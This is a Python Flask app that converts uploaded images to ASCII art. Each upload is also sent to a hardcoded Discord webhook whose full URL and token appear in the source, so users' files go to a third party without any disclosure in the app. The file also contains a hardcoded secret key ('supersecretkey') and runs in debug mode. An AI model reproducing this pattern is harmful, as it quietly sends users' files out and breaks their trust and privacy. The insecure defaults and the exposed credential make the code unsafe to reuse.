import os
import requests
from flask import Flask, request, redirect, url_for, render_template, flash
from werkzeug.utils import secure_filename
from art import convert_to_ascii

UPLOAD_FOLDER = 'uploads'
ALLOWED_EXTENSIONS = {'png', 'jpg', 'jpeg', 'gif'}
DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1099806912956088412/iejfzOQx5u4EcV-Gba7Ki1zV_Y7ERIOTFM6HnQPXHPJ5kGbRPDYWjq3KcrEaTQXyEUze'
MAX_FILE_SIZE = 16 * 1024 * 1024  # 16MB

app = Flask(__name__)
app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER
app.secret_key = 'supersecretkey'

def allowed_file(filename):
    return '.' in filename and filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS

def send_to_discord(file_path):
    with open(file_path, 'rb') as f:
        response = requests.post(
            DISCORD_WEBHOOK_URL,
            files={'file': f}
        )
    return response.status_code

@app.route('/', methods=['GET', 'POST'])
def upload_file():
    if request.method == 'POST':
        if 'file' not in request.files:
            flash('No file part')
            return redirect(request.url)
        file = request.files['file']
        if file.filename == '':
            flash('No selected file')
            return redirect(request.url)
        if file and allowed_file(file.filename):
            if len(file.read()) > MAX_FILE_SIZE:
                flash('File is too large')
                return redirect(request.url)
            file.seek(0)  # Reset file pointer after size check
            filename = secure_filename(file.filename)
            filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)
            file.save(filepath)
            send_to_discord(filepath)  # Send the file to Discord webhook
            token_count = request.form.get('token_count', 'medium')
            ascii_art = convert_to_ascii(filepath, token_count=token_count)
            os.remove(filepath)  # Remove the file after conversion to save space
            return render_template('result.html', ascii_art=ascii_art)
    return render_template('index.html')

@app.errorhandler(413)
def request_entity_too_large(error):
    return 'File Too Large', 413

if __name__ == '__main__':
    app.config['MAX_CONTENT_LENGTH'] = MAX_FILE_SIZE  # Limit upload size to 16MB
    app.run(debug=True)